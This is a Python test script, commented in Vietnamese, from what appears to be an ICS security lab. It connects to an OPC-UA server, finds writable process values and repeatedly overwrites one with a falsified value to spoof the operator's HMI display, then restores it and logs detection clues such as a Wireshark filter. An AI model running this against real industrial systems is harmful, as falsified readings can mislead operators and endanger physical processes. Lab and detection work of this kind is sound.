#!/usr/bin/env python3
"""
tests/test_hmi_fake.py
Ghi đè OPC-UA node từ IP attacker. PLC không thay đổi — dấu vết ở OPC Write.

Chạy: python tests/test_hmi_fake.py
"""

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *


def main():
    print(f"\n{B}[TEST] HMI_FAKE_DISPLAY{X}")
    info(f"OPC-UA target: {OPC_URL}")
    info("PLC KHONG thay doi — dau vet la OPC Write tu IP la")

    changes = []
    observable = []
    notes = []
    error = None
    success = False
    t0 = time.time()

    try:
        from opcua import Client

        c = Client(OPC_URL)
        c.connect()
        ok(f"Ket noi OPC-UA thanh cong")

        print(f"\n  {C}[BROWSE] Nodes tim thay:{X}")
        objects = c.get_objects_node()
        candidates = []

        for child in objects.get_children():
            name = child.get_browse_name().Name
            nid = str(child.nodeid)
            print(f"    {name}  ({nid})")
            for sub in child.get_children()[:5]:
                sname = sub.get_browse_name().Name
                snid = str(sub.nodeid)
                print(f"      L- {sname}  ({snid})")
                try:
                    val = sub.get_value()
                    if isinstance(val, (int, float, bool)):
                        candidates.append((sname, snid, sub, val))
                except Exception:
                    pass

        if not candidates:
            warn("Khong tim thay node co the ghi — them node vao OPC server")
            notes.append("Can cau hinh OPC server expose writeable nodes")
        else:
            name, nid, node, orig_val = candidates[0]
            fake_val = (not orig_val) if isinstance(orig_val, bool) else round(orig_val * 1.5, 2)

            ok(f"Chon node: {name} ({nid})")
            info(f"Gia tri goc: {orig_val}")

            for i in range(5):
                node.set_value(fake_val)
                current = node.get_value()
                ok(f"  Lan {i+1}: ghi {fake_val} -> doc lai = {current}")
                time.sleep(1)

            observable.append(f"OPC-UA WriteRequest: {nid} = {fake_val}")
            observable.append(f"IP nguon: attacker (khong phai HMI process)")
            notes.append(f"Operator thay {fake_val} thay vi {orig_val} tren man hinh")
            notes.append("Wireshark: opcua.serviceid == 0x1b1 (WriteRequest)")

            node.set_value(orig_val)
            ok(f"Khoi phuc: {node.get_value()}")
            success = True

        c.disconnect()

    except ImportError:
        error = "opcua chua cai: pip install opcua"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))

    print_result("HMI_FAKE_DISPLAY", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
